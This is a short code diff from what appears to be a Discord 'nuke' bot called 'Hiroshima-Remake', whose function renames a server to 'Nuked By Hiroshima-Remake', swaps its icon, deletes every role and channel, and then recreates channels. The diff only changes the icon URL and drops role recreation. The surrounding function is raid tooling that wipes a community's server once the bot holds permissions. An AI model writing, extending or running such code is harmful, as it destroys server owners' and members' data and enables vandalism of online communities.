@@ -10,7 +10,9 @@ export default async function nuke() {
   if (!(await checkPermissions(bot))) return;
 
   await guild.setName("Nuked By Hiroshima-Remake");
-  await guild.setIcon("https://i.ibb.co/KpWPb7b3/download.jpg");
+  await guild.setIcon(
+    "https://i.ibb.co/WN9MmvJs/the-kingth-of-kutet-thukuna.jpg"
+  );
 
   const deleteRoles = RoleManager.deleteAllRoles(guild);
   const deleteChannels = ChannelManager.deleteAllChannels(guild);
@@ -19,8 +21,6 @@ export default async function nuke() {
   await deleteChannels;
 
   const createChannels = ChannelManager.createChannel(guild);
-  const createRoles = RoleManager.createRole(guild);
 
   await createChannels;
-  await createRoles;
 }
